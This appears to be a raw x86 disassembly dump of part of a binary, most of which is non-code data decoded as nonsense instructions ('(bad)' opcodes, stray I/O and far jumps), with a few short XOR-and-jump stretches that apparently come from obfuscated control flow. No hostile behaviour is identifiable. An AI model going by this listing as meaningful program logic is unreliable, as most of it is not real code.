  410649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41064a:	adc    eax,0xc7c69445
  41064f:	fs mov eax,0x281a78cd
  410655:	pop    esi
  410656:	mov    ss,WORD PTR [ecx]
  410658:	les    ebx,FWORD PTR [edx+0x62a746ee]
  41065e:	inc    eax
  41065f:	pop    es
  410660:	enter  0xa36e,0x35
  410664:	jge    0x410602
  410666:	sub    ecx,DWORD PTR [bp-0x7cb8]
  41066b:	jae    0x410602
  41066d:	sbb    eax,esi
  41066f:	and    bh,dl
  410671:	mov    dh,0x70
  410673:	frstor [eax-0x79]
  410676:	mov    cl,0x4a
  410678:	jae    0x4106b3
  41067a:	rcl    BYTE PTR [eax],cl
  41067c:	(bad)  
  41067d:	in     al,dx
  41067e:	fsubr  DWORD PTR [ebx]
  410680:	sahf   
  410681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410682:	sbb    eax,0x295f54f1
  410687:	cmp    esi,esp
  410689:	jbe    0x410658
  41068b:	xchg   BYTE PTR [ebp+eiz*4-0x54],ah
  41068f:	dec    edx
  410690:	retf   0xfa1e
  410693:	sub    ah,cl
  410695:	mov    dl,0xed
  410697:	xor    al,0x51
  410699:	mov    dh,BYTE PTR ds:0xd4527390
  4106a0:	pushf  
  4106a1:	mov    ecx,edi
  4106a3:	xchg   DWORD PTR [eax],esp
  4106a5:	xchg   esp,eax
  4106a6:	out    0xa,al
  4106a8:	call   0x53cf:0x27aa78b2
  4106af:	mov    dh,0x10
  4106b1:	pop    ds
  4106b2:	fs mov ebx,ds
  4106b5:	sbb    edi,DWORD PTR [edi+0x6d4cf80d]
  4106bb:	dec    esp
  4106bc:	mul    DWORD PTR [edx+0x396cc015]
  4106c2:	fwait
  4106c3:	add    DWORD PTR [ebp+0x2fae028b],edi
  4106c9:	in     al,dx
  4106ca:	mov    bl,0xd8
  4106cc:	or     edx,DWORD PTR [ebx+0x4b05c1ea]
  4106d2:	psrlw  mm4,QWORD PTR [eax+edx*8]
  4106d6:	jle    0x410733
  4106d8:	inc    edx
  4106d9:	push   esp
  4106da:	in     eax,0x9
  4106dc:	jle    0x4106b6
  4106de:	outs   dx,DWORD PTR ds:[esi]
  4106df:	ja     0x410753
  4106e1:	jo     0x410705
  4106e3:	call   0x7783:0x491b09bd
  4106ea:	pop    ecx
  4106eb:	add    eax,0x56da575a
  4106f0:	mov    ch,BYTE PTR [edi-0x363de901]
  4106f6:	ins    DWORD PTR es:[edi],dx
  4106f7:	inc    esi
  4106f8:	mov    ecx,0xae8089d9
  4106fd:	mov    ah,0x1
  4106ff:	fs jnp 0x410757
  410702:	jb     0x410717
  410704:	mov    ds:0x79fef192,eax
  410709:	bound  ebp,QWORD PTR [ebx]
  41070b:	inc    edi
  41070c:	and    al,0x71
  41070e:	loope  0x4106a4
  410710:	xor    al,0x80
  410712:	pop    esi
  410713:	inc    eax
  410714:	popa   
  410715:	pushf  
  410716:	call   0x40c0bf9b
  41071b:	into   
  41071c:	xchg   esp,eax
  41071d:	fs xchg bl,bh
  410720:	push   cs
  410721:	adc    DWORD PTR [eax-0x48],esp
  410724:	or     BYTE PTR [eax+0x751e096b],0x4f
  41072b:	pop    esi
  41072c:	dec    BYTE PTR [ebp+0x3b]
  41072f:	sub    al,0x26
  410731:	push   0x5c
  410733:	push   ss
  410734:	fcmovbe st,st(2)
  410736:	add    al,0x4
  410738:	xchg   ebp,eax
  410739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41073a:	push   edx
  41073b:	and    al,0xcb
  41073d:	inc    ebx
  41073e:	or     bl,cl
  410740:	mov    edi,0xed30b0ed
  410745:	push   ebx
  410746:	inc    ebp
  410747:	mov    ecx,0x60707217
  41074c:	ja     0x410736
  41074e:	jmp    0x8d81cec6
  410753:	fs pop ecx
  410755:	pop    esp
  410756:	(bad)  
  410759:	enter  0xf0f0,0xd2
  41075d:	pop    es
  41075e:	push   ecx
  41075f:	jle    0x410763
  410761:	mov    WORD PTR [edi+ebx*2],fs
  410764:	in     eax,dx
  410765:	ins    BYTE PTR es:[edi],dx
  410766:	or     al,0xe9
  410768:	into   
  410769:	pop    ecx
  41076a:	jmp    0x5774549c
  41076f:	ss call 0x1d7ae9f7
  410775:	pop    es
  410776:	fsubr  DWORD PTR [eax]
  410778:	cmp    DWORD PTR [eax+0x2e98d49d],esi
  41077e:	and    BYTE PTR [edi],0x3d
  410781:	add    eax,0x20cbd5f0
  410786:	cdq    
  410787:	mov    DWORD PTR [ebx+0x32],ebp
  41078a:	jmp    0x52599a29
  41078f:	out    0x81,eax
  410791:	call   0x9af0c2f5
  410796:	test   al,0xa7
  410798:	int3   
  410799:	cmp    DWORD PTR [edx-0x71],esi
  41079c:	push   cs
  41079d:	repz sub edx,DWORD PTR [ebp+0x79]
  4107a1:	(bad)  [edx]
  4107a3:	neg    DWORD PTR cs:[ecx-0x8aad1c4]
  4107aa:	jle    0x41074d
  4107ac:	mov    dl,dl
  4107ae:	out    0xfc,eax
  4107b0:	add    bl,BYTE PTR [eax+ebx*1]
  4107b3:	mov    al,0xe0
  4107b5:	(bad)  
  4107b6:	repnz push 0xef07d796
  4107bc:	out    0xa2,al
  4107be:	jno    0x410795
  4107c0:	imul   eax,DWORD PTR [esi+0x7839cacd],0xffffffd2
  4107c7:	and    eax,0x61920a1
  4107cc:	outs   dx,DWORD PTR ds:[esi]
  4107cd:	adc    al,0x5d
  4107cf:	inc    ebp
  4107d0:	jbe    0x41081f
  4107d2:	cmp    DWORD PTR [ecx+ebp*2],esi
  4107d5:	clc    
  4107d6:	dec    edi
  4107d7:	popf   
  4107d8:	cmp    BYTE PTR [edx],ch
  4107da:	out    0x21,al
  4107dc:	pop    DWORD PTR [esi-0xd11e447]
  4107e2:	mov    eax,0xd95ec774
  4107e7:	add    ah,bh
  4107e9:	(bad)  
  4107ea:	in     eax,dx
  4107eb:	dec    ebp
  4107ec:	mov    ds:0x45193faf,al
  4107f1:	mov    ebx,0xfae9c9ba
  4107f6:	popa   
  4107f7:	fistp  WORD PTR [esp+ecx*2-0x25c420d5]
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	and    BYTE PTR [ebx],ah
  410811:	push   ds
  410812:	shl    DWORD PTR [esi-0x1a8787af],1
  410818:	jle    0x410892
  41081a:	js     0x4107f8
  41081c:	xor    eax,0x79da9749
  410821:	jle    0x4107f7
  410823:	jns    0x4107e3
  410825:	inc    esp
  410826:	sbb    DWORD PTR [esi],edi
  410828:	adc    DWORD PTR [edx+0x50],0x8275e709
  41082f:	into   
  410830:	add    al,0xf3
  410832:	stos   BYTE PTR es:[edi],al
  410833:	pop    esp
  410834:	inc    DWORD PTR cs:[esp+ebx*4]
  410838:	ins    BYTE PTR es:[edi],dx
  410839:	(bad)  
  41083a:	(bad)  
  41083b:	mov    dl,0xe4
  41083d:	pop    es
  41083e:	adc    BYTE PTR [ebx+esi*1-0x6f],bh
  410842:	sbb    al,0xc6
  410844:	lahf   
  410845:	push   ecx
  410846:	clc    
  410847:	dec    esi
  410848:	repz add eax,0x26dcd996
  41084e:	mov    esp,0x32c0b7af
  410853:	push   ebp
  410854:	inc    ebx
  410855:	sub    eax,DWORD PTR [ebx-0x45]
  410858:	cmp    esi,esi
  41085a:	stos   DWORD PTR es:[edi],eax
  41085b:	das    
  41085c:	addr16 jne 0x410885
  41085f:	(bad)  
  410860:	jb     0x410819
  410862:	mov    ah,0x6c
  410864:	repz (bad) 
  410867:	xchg   ecx,eax
  410868:	adc    dh,BYTE PTR [ebp+0x37e657ed]
  41086e:	adc    DWORD PTR ss:[edi+0x5ed6dfad],eax
  410875:	ja     0x410815
  410877:	pusha  
  410878:	mov    ecx,DWORD PTR [eax+0xa]
  41087b:	jmp    0x7b56d69b
  410880:	mov    ebx,0x2b3ee0e3
  410885:	(bad)  
  410886:	sbb    eax,0xbc82371
  41088b:	fsub   DWORD PTR [edx-0x45]
  41088e:	scas   al,BYTE PTR es:[edi]
  41088f:	pushf  
  410890:	adc    al,0xe9
  410892:	mov    eax,ds:0x3a4087b4
  410897:	xchg   ebp,eax
  410898:	popa   
  410899:	jmp    0xd801fbc3
  41089e:	fst    QWORD PTR [esi+0x35ebcad9]
  4108a4:	mov    ch,0x1c
  4108a6:	dec    edx
  4108a7:	and    BYTE PTR [eax],al
  4108a9:	gs pop edi
  4108ab:	cs pop es
  4108ad:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4108af:	adc    esp,DWORD PTR [esi]
  4108b1:	xchg   DWORD PTR [ecx+0x7c587001],ebp
  4108b7:	dec    ebx
  4108b8:	fst    DWORD PTR [eax-0x11]
  4108bb:	mov    dl,0xb1
  4108bd:	lea    edi,[ecx+0x1]
  4108c0:	lods   eax,DWORD PTR ds:[esi]
  4108c1:	mov    esp,0x67099b9
  4108c6:	stos   DWORD PTR es:[edi],eax
  4108c7:	ins    BYTE PTR es:[edi],dx
  4108c8:	xchg   edi,eax
  4108c9:	mov    edi,0x6848ed1a
  4108ce:	add    al,0x56
  4108d0:	xchg   BYTE PTR ss:[ecx-0x2b],dl
  4108d4:	(bad)  
  4108d5:	sbb    eax,0x3cebcef
  4108da:	mov    edx,0xe296f5f5
  4108df:	je     0x410902
  4108e1:	test   cl,0xa0
  4108e4:	rol    bl,0xf
  4108e7:	arpl   cx,sp
  4108e9:	js     0x410897
  4108eb:	test   BYTE PTR [ecx-0xea9c2f9],ah
  4108f1:	jae    0x410936
  4108f3:	call   0x9836:0xe872af73
  4108fa:	sub    eax,DWORD PTR [edi-0x599e3e8c]
  410900:	dec    ebp
  410901:	sub    BYTE PTR [eax+0x227ce070],bh
  410907:	dec    ebx
  410908:	hlt    
  410909:	dec    edx
  41090a:	inc    esp
  41090b:	push   ecx
  41090c:	test   al,0xf0
  41090e:	call   0x2b5a37c1
  410913:	xchg   BYTE PTR [eax+0x65f71643],cl
  410919:	lahf   
  41091a:	adc    DWORD PTR [ebx+0x33],ebp
  41091d:	sbb    BYTE PTR [eax],bh
  41091f:	inc    ebx
  410920:	inc    edx
  410921:	xor    DWORD PTR [ecx],esi
  410923:	adc    DWORD PTR [ebp+edx*4+0x286fb3f6],edx
  41092a:	data16 and BYTE PTR [ebx+0x7c5794b],0x94
  410932:	fadd   QWORD PTR [ecx]
  410934:	stos   DWORD PTR es:[edi],eax
  410935:	or     BYTE PTR cs:[esi],cl
  410938:	xlat   BYTE PTR ds:[ebx]
  410939:	mov    ds:0x881790ec,al
  41093e:	loop   0x410941
  410940:	mov    BYTE PTR [esi+0x46],ah
  410943:	das    
  410944:	arpl   WORD PTR [eax-0x37a8ed28],si
  41094a:	mov    BYTE PTR [ebp-0x2eb9d093],dh
  410950:	adc    eax,0xfeb8c8ea
  410955:	inc    edx
  410956:	push   eax
  410957:	popf   
  410958:	sahf   
  410959:	mov    al,0x3a
  41095b:	dec    edi
  41095c:	ja     0x41099a
  41095e:	test   BYTE PTR [ebx+0x4073a45],dh
  410964:	imul   ecx,edx,0xee288171
  41096a:	imul   ebx,DWORD PTR [esi-0x9],0xd7fabba8
  410971:	add    DWORD PTR [esp+esi*2-0x24],0xef2f7eb4
  410979:	jp     0x410948
  41097b:	add    edi,DWORD PTR [ebp-0x8]
  41097e:	adc    al,0x58
  410980:	push   edx
  410981:	jb     0x41094b
  410983:	sbb    al,0x4e
  410985:	push   ss
  410986:	push   eax
  410987:	outs   dx,BYTE PTR ds:[esi]
  410988:	xor    eax,ecx
  41098a:	dec    esp
  41098b:	adc    cl,bh
  41098d:	adc    edx,0xfffffff4
  410990:	pop    ebx
  410991:	sub    BYTE PTR [edi],0x6d
  410994:	scas   al,BYTE PTR es:[edi]
  410995:	aam    0x95
  410997:	inc    edi
  410998:	inc    ebx
  410999:	jbe    0x410981
  41099b:	(bad)  
  41099c:	mov    BYTE PTR [esi-0x2e],ch
  41099f:	sub    ebp,ebx
  4109a1:	nop
  4109a2:	sti    
  4109a3:	lods   eax,DWORD PTR ds:[esi]
  4109a4:	or     edi,DWORD PTR [ecx+0x3b3294f3]
  4109aa:	in     al,0xf4
  4109ac:	pop    eax
  4109ad:	pop    esp
  4109ae:	test   al,0xd9
  4109b0:	sub    ch,BYTE PTR [eax-0x54]
  4109b3:	mov    al,0xff
  4109b5:	mov    dl,BYTE PTR [ecx+0x15]
  4109b8:	and    al,0xdf
  4109ba:	out    0x3d,eax
  4109bc:	or     ch,BYTE PTR [ebp+0x1e]
  4109bf:	ins    BYTE PTR es:[edi],dx
  4109c0:	cmp    eax,0x36b359b
  4109c5:	jle    0x410968
  4109c7:	push   ss
  4109c8:	jp     0x4109bc
  4109ca:	ins    DWORD PTR es:[edi],dx
  4109cb:	inc    eax
  4109cc:	sbb    bl,al
  4109ce:	and    al,0x23
  4109d0:	and    BYTE PTR [edi-0x4c],dh
  4109d3:	sbb    eax,0xffb361a8
  4109d8:	push   ebx
  4109d9:	push   cs
  4109da:	inc    edi
  4109db:	jne    0x410a07
  4109dd:	xchg   DWORD PTR [edi],esp
  4109df:	outs   dx,BYTE PTR ds:[esi]
  4109e0:	icebp  
  4109e1:	push   ss
  4109e2:	mov    eax,ds:0x299261dd
  4109e7:	lea    edi,[esi-0x37352892]
  4109ed:	ds aad 0x4e
  4109f0:	inc    BYTE PTR [esi-0x61]
  4109f3:	ret    0x532e
  4109f6:	inc    esi
  4109f7:	lods   al,BYTE PTR ds:[esi]
  4109f8:	sahf   
  4109f9:	or     BYTE PTR [esi-0x66],bl
  4109fc:	dec    ecx
  4109fd:	inc    esi
  4109fe:	and    BYTE PTR [edx-0x4e],bh
  410a01:	jnp    0x4109b7
  410a03:	loop   0x410a41
  410a05:	out    0x99,al
  410a07:	mov    al,ds:0x37932246
  410a0c:	push   ds
  410a0d:	js     0x410a7b
  410a0f:	hlt    
  410a10:	fcmove st,st(4)
  410a12:	inc    ebp
  410a13:	xchg   esp,eax
  410a14:	xchg   ecx,eax
  410a15:	dec    esi
  410a16:	push   esi
  410a17:	jbe    0x410a56
  410a19:	push   0xffffffc6
  410a1b:	test   BYTE PTR [ebx],dl
  410a1d:	dec    esi
  410a1e:	jge    0x410a33
  410a20:	cmp    ch,BYTE PTR [edx]
  410a22:	stos   DWORD PTR es:[edi],eax
  410a23:	sub    eax,0xe94d9bbe
  410a28:	xchg   edi,eax
  410a29:	stos   DWORD PTR es:[edi],eax
  410a2a:	ins    BYTE PTR es:[edi],dx
  410a2b:	bound  edi,QWORD PTR [eax+0x2]
  410a2e:	mov    esi,0x431fc18b
  410a33:	jecxz  0x410a0a
  410a35:	pop    edx
  410a36:	data16 mov cl,0xd2
  410a39:	std    
  410a3a:	pop    DWORD PTR [edx]
  410a3c:	or     ecx,DWORD PTR [edx+0x46a7e711]
  410a42:	and    dl,BYTE PTR [esp+ebp*8-0x258995c5]
  410a49:	mov    edx,0x4e952854
  410a4e:	jno    0x410aa1
  410a50:	mov    edx,0x1aecbcf4
  410a55:	(bad)  
  410a56:	adc    esi,esp
  410a58:	mov    bh,0xb7
  410a5a:	dec    ecx
  410a5b:	inc    ebx
  410a5c:	pop    ecx
  410a5d:	aaa    
  410a5e:	mov    cl,0x9c
  410a60:	mov    ds:0x7b63a585,al
  410a65:	inc    ecx
  410a66:	sahf   
  410a67:	fstp   st(4)
  410a69:	add    ch,BYTE PTR [edi-0x2215a64e]
  410a6f:	loop   0x410ab7
  410a71:	je     0x410a28
  410a73:	xchg   esi,eax
  410a74:	xchg   esi,eax
  410a75:	inc    ecx
  410a76:	xchg   ebp,eax
  410a77:	cmc    
  410a78:	mov    bh,BYTE PTR [edx]
  410a7a:	inc    edi
  410a7b:	test   ebp,ebx
  410a7d:	adc    DWORD PTR [ecx],ebx
  410a7f:	mov    ecx,0x9827207a
  410a84:	pop    eax
  410a85:	into   
  410a86:	ja     0x410a94
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	idiv   DWORD PTR [edx+0x134a1199]
  410ab4:	push   esi
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	(bad)  
  410abc:	cmc    
  410abd:	fadd   QWORD PTR [edx-0x538ce84e]
  410ac3:	cli    
  410ac4:	xchg   ebx,eax
  410ac5:	pop    esi
  410ac6:	pop    ds
  410ac7:	loope  0x410a7f
  410ac9:	dec    edi
  410aca:	dec    eax
  410acb:	fld    TBYTE PTR [edi]
  410acd:	sbb    DWORD PTR [esi-0x7ac52478],edx
  410ad3:	xchg   ebx,eax
  410ad4:	lock lods eax,DWORD PTR ds:[esi]
  410ad6:	cmp    al,0xd
  410ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad9:	cmp    BYTE PTR [ecx],dh
  410adb:	leave  
  410adc:	cmc    
  410add:	jle    0x410a61
  410adf:	mov    ah,BYTE PTR [ebp+0x710a854a]
  410ae5:	push   ebx
  410ae6:	sbb    al,0xa8
  410ae8:	dec    eax
  410ae9:	ds mov bh,0xd8
  410aec:	gs cs ja 0x410a84
  410af0:	scas   al,BYTE PTR es:[edi]
  410af1:	gs or  al,0x6b
  410af4:	imul   DWORD PTR [edi+0x62014585]
  410afa:	or     eax,0x76d4dae8
  410aff:	int3   
  410b00:	into   
  410b01:	mov    esp,0x783193c6
  410b06:	inc    ecx
  410b07:	jecxz  0x410b5d
  410b09:	jns    0x410b82
  410b0b:	cmc    
  410b0c:	add    ah,ah
  410b0e:	rol    BYTE PTR [eax+0x5c1a9d6b],0x85
  410b15:	pop    esp
  410b16:	mov    eax,0xbc55762c
  410b1b:	mov    ecx,0xa916538f
  410b20:	mov    edi,0x3b5b8733
  410b25:	sub    DWORD PTR [esi],esi
  410b27:	or     ah,BYTE PTR [edx-0x26]
  410b2a:	mov    DWORD PTR [eax],eax
  410b2c:	dec    esp
  410b2d:	neg    DWORD PTR [ecx+eax*4+0x5c]
  410b31:	call   0x74df:0x13ab5047
  410b38:	scas   al,BYTE PTR es:[edi]
  410b39:	jbe    0x410af3
  410b3b:	(bad)  
  410b3c:	rcl    DWORD PTR ds:0x43f0ddbb,1
  410b42:	cli    
  410b43:	push   0xffffffd3
  410b45:	xor    al,0x26
  410b47:	daa    
  410b48:	sbb    BYTE PTR [ebp-0x2ce37556],ch
  410b4e:	pop    eax
  410b4f:	ja     0x410b87
  410b51:	xchg   ecx,eax
  410b52:	out    0x3c,al
  410b54:	leave  
  410b55:	ins    BYTE PTR es:[edi],dx
  410b56:	outs   dx,DWORD PTR ds:[esi]
  410b57:	jle    0x410bb0
  410b59:	das    
  410b5a:	and    edi,DWORD PTR [edi]
  410b5c:	shl    DWORD PTR [edx+0x6],0x1b
  410b60:	fbstp  TBYTE PTR [edx+ecx*4+0x16]
  410b64:	aam    0x74
  410b66:	loop   0x410af1
  410b68:	into   
  410b69:	and    DWORD PTR [edi-0x51],ebp
  410b6c:	in     eax,0x8c
  410b6e:	pop    ebp
  410b6f:	loope  0x410b6a
  410b71:	pop    es
  410b72:	icebp  
  410b73:	sar    al,0xc6
  410b76:	add    eax,0x1d6d1e8b
  410b7b:	xchg   edi,eax
  410b7c:	outs   dx,DWORD PTR ds:[esi]
  410b7d:	add    ch,BYTE PTR [esi]
  410b7f:	sar    BYTE PTR [ebx],0xa0
  410b82:	ins    DWORD PTR es:[edi],dx
  410b83:	popf   
  410b84:	subps  xmm7,XMMWORD PTR [ecx+0x36]
  410b88:	jl     0x410bb3
  410b8a:	jp     0x410b45
  410b8c:	(bad)  
  410b8d:	adc    DWORD PTR [edx+0x4720e841],eax
  410b93:	mov    edx,0x37b8f0a8
  410b98:	sbb    edx,esp
  410b9a:	mov    esp,0x654af136
  410b9f:	cmp    ecx,DWORD PTR [eax-0x70a2b94e]
  410ba5:	mov    esp,0x94aa18f4
  410baa:	(bad)  
  410bab:	jp     0x410b74
  410bad:	daa    
  410bae:	mov    eax,ds:0xb19cc8be
  410bb3:	loopne 0x410bb6
  410bb5:	fimul  DWORD PTR [esi+eiz*2-0x33]
  410bb9:	mov    bl,0xc2
  410bbb:	data16 jne 0x410bb6
  410bbe:	lds    ebx,FWORD PTR [edi]
  410bc0:	repz call 0x6c70299
  410bc6:	outs   dx,BYTE PTR ds:[esi]
  410bc7:	xor    al,0x4a
  410bc9:	(bad)  
  410bca:	adc    BYTE PTR [ebx],dh
  410bcc:	push   ds
  410bcd:	add    DWORD PTR [ebp+0x24ebbf04],eax
  410bd3:	push   ds
  410bd4:	and    al,BYTE PTR [esp+ebp*1+0x13d1cf84]
  410bdb:	lods   eax,DWORD PTR ds:[esi]
  410bdc:	retf   
  410bdd:	cmp    ah,BYTE PTR fs:[esi]
  410be0:	aam    0x1
  410be2:	mov    eax,ds:0xba20debb
  410be7:	scas   al,BYTE PTR es:[edi]
  410be8:	in     al,0xb3
  410bea:	mov    eax,ds:0x6c711875
  410bef:	ins    BYTE PTR es:[edi],dx
  410bf0:	out    dx,eax
  410bf1:	loop   0x410ba7
  410bf3:	mov    ebp,0xf9fa9c82
  410bf8:	in     al,dx
  410bf9:	repnz lahf 
  410bfb:	sbb    ah,BYTE PTR [ecx]
  410bfd:	sbb    ch,al
  410bff:	sar    DWORD PTR ds:[ebx-0x2301eb64],0x40
  410c07:	xchg   ebp,eax
  410c08:	out    0x39,al
  410c0a:	push   edx
  410c0b:	mov    ds:0xc4659791,al
  410c10:	ins    BYTE PTR es:[edi],dx
  410c11:	and    ah,BYTE PTR [ecx]
  410c13:	inc    DWORD PTR [edi+edi*2-0x16023fae]
  410c1a:	sub    al,0x3c
  410c1c:	xchg   edx,eax
  410c1d:	and    DWORD PTR [edi-0x7656d647],edi
  410c23:	mov    edi,0x2ad45f5c
  410c28:	sub    BYTE PTR [ecx],0x42
  410c2b:	inc    esi
  410c2c:	ret    
  410c2d:	jmp    0xa7248d9b
  410c32:	int3   
  410c33:	push   es
  410c34:	push   0x42
  410c36:	jns    0x410bde
  410c38:	sub    al,0x6a
  410c3a:	add    esi,ebp
  410c3c:	cmp    ebx,ebx
  410c3e:	fist   WORD PTR [ecx-0x3480aa09]
  410c44:	dec    esp
  410c45:	mov    bl,BYTE PTR [ebp-0x4c9c9a53]
  410c4b:	and    bl,ch
  410c4d:	icebp  
  410c4e:	mov    ebx,0xd1942329
  410c53:	ds sub al,0xb8
  410c56:	and    BYTE PTR [ecx],0x2c
  410c59:	or     dh,BYTE PTR [edi]
  410c5b:	xor    eax,0xbe30cc56
  410c60:	sub    eax,esi
  410c62:	mov    ah,BYTE PTR [eax]
  410c64:	sbb    DWORD PTR [eax+0x4cf4b015],ebp
  410c6a:	xor    cl,bl
  410c6c:	xor    esp,DWORD PTR [ecx-0x79a3852c]
  410c72:	pop    ecx
  410c73:	pusha  
  410c74:	enter  0xabce,0x50
  410c78:	ret    
  410c79:	or     al,0x26
  410c7b:	sub    DWORD PTR [ebp+eiz*2+0x2e984ff1],ebp
  410c82:	stc    
  410c83:	leave  
  410c84:	call   0xe979c133
  410c89:	jo     0x410c64
  410c8b:	ins    DWORD PTR es:[edi],dx
  410c8c:	pop    ebp
  410c8d:	stc    
  410c8e:	push   es
  410c8f:	lods   eax,DWORD PTR ds:[esi]
  410c90:	call   0x4eaa:0x9837460e
  410c97:	dec    edi
  410c98:	mov    ebp,ecx
  410c9a:	hlt    
  410c9b:	mov    WORD PTR [edx-0x45f936da],fs
  410ca1:	mov    esp,0x98e5112e
  410ca6:	fwait
  410ca7:	outs   dx,BYTE PTR ds:[esi]
  410ca8:	or     eax,0x6d36e9fc
  410cad:	inc    edx
  410cae:	and    eax,0x7bd89d3
  410cb3:	xchg   ebx,eax
  410cb4:	aam    0xb6
  410cb6:	mov    ch,0x5f
  410cb8:	sbb    BYTE PTR [esi+0x71],dh
  410cbb:	test   eax,0x5441fa8
  410cc0:	lods   eax,DWORD PTR ds:[esi]
  410cc1:	jb     0x410d25
  410cc3:	cld    
  410cc4:	aam    0xaa
  410cc6:	xor    eax,0xebf83d11
  410ccb:	jmp    0x7e4cd409
  410cd0:	fild   QWORD PTR [eax-0x32]
  410cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cd4:	rol    DWORD PTR [edx-0x42],0x93
  410cd8:	cli    
  410cd9:	ror    BYTE PTR [eax+0x7c94bb8f],cl
  410cdf:	outs   dx,BYTE PTR ds:[esi]
  410ce0:	outs   dx,DWORD PTR ds:[esi]
  410ce1:	ss pop esp
  410ce3:	shl    DWORD PTR [ebx-0x455aa859],1
  410ce9:	push   ebx
  410cea:	or     ecx,esi
  410cec:	xchg   esi,eax
  410ced:	inc    eax
  410cee:	dec    edi
  410cef:	pandn  mm6,QWORD PTR [ecx-0x78]
  410cf3:	inc    edi
  410cf4:	cmp    bh,al
  410cf6:	and    al,BYTE PTR [edi]
  410cf8:	repnz das 
  410cfa:	call   0xf50732ff
  410cff:	pop    eax
  410d00:	push   ebx
  410d01:	or     bl,BYTE PTR [edi+edx*2-0x7103f983]
  410d08:	ss and edx,0xf5cc06e3
  410d0f:	cld    
  410d10:	into   
  410d11:	jmp    0x9c30:0x608f52da
  410d18:	hlt    
  410d19:	dec    edi
  410d1a:	or     bh,bl
  410d1c:	push   0x84440147
  410d21:	mov    bl,0x40
  410d23:	popf   
  410d24:	push   ebx
  410d25:	out    dx,eax
  410d26:	add    edi,ecx
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	jbe    0x410d54
  410d62:	xchg   ebx,eax
  410d63:	(bad)  
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	(bad)  
  410d6d:	imul   dh
  410d6f:	adc    DWORD PTR [edi],eax
  410d71:	push   ecx
  410d72:	cmp    BYTE PTR [ebp+0x2ce7835d],cl
  410d78:	add    eax,0xc6d28763
  410d7d:	or     bh,cl
  410d7f:	cmp    eax,0x45c69575
  410d84:	cmc    
  410d85:	or     DWORD PTR [ebx-0x1f],edx
  410d88:	xor    BYTE PTR [eax+esi*8-0x73],0x3b
  410d8d:	mov    ecx,0x1706d43
  410d92:	mov    al,0x69
  410d94:	fiadd  WORD PTR [ebx-0x60]
  410d97:	inc    edi
  410d98:	xor    DWORD PTR [edx],esi
  410d9a:	daa    
  410d9b:	aad    0x8c
  410d9d:	sbb    BYTE PTR [edx+0x7e],al
  410da0:	sti    
  410da1:	sub    eax,0x36faa533
  410da6:	aad    0x53
  410da8:	and    bh,BYTE PTR [edx+0x57]
  410dab:	or     eax,0x7ccc9eb2
  410db0:	xor    DWORD PTR [ebx+0x2470e88f],edi
  410db6:	pop    ebx
  410db7:	out    dx,al
  410db8:	(bad)  
  410db9:	mov    bh,0xfa
  410dbb:	jp     0x410dc5
  410dbd:	sbb    BYTE PTR ds:0x5eef1010,dh
  410dc3:	ins    DWORD PTR es:[edi],dx
  410dc4:	bound  ecx,QWORD PTR [edi+0x77]
  410dc7:	jmp    0x356a:0x3035d3a3
  410dce:	pop    ss
  410dcf:	jns    0x410d8c
  410dd1:	nop
  410dd2:	nop
  410dd3:	fwait
  410dd4:	and    BYTE PTR [ebx],al
  410dd6:	xchg   dh,bl
  410dd8:	test   BYTE PTR [ecx-0x46],0xf1
  410ddc:	inc    edi
  410ddd:	and    cl,BYTE PTR [ecx-0x1b]
  410de0:	iret   
  410de1:	outs   dx,DWORD PTR ds:[esi]
  410de2:	shl    BYTE PTR ds:0x86a5cbde,1
  410de8:	out    0x5,al
  410dea:	adc    bh,BYTE PTR [ebx-0x141bbd7b]
  410df0:	(bad)  
  410df1:	jmp    0x410e63
  410df3:	xchg   esp,eax
  410df4:	and    ebp,ebx
  410df6:	push   ebp
  410df7:	cmp    dh,ch
  410df9:	cmp    BYTE PTR [esi+0x3a91c875],dh
  410dff:	lahf   
  410e00:	fnstcw WORD PTR ds:0x8755605f
  410e06:	pop    ds
  410e07:	xchg   esi,eax
  410e08:	ret    
  410e09:	and    edi,esi
  410e0b:	fs pop edx
  410e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e0e:	pushf  
  410e0f:	xor    bl,BYTE PTR [ebx-0x7716e48]
  410e15:	jecxz  0x410e01
  410e17:	push   0xffffffac
  410e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e1a:	cmp    BYTE PTR [edi+eiz*8],cl
  410e1d:	pushf  
  410e1e:	cmp    DWORD PTR [ebp+edx*1+0x5e],ebp
  410e22:	inc    edx
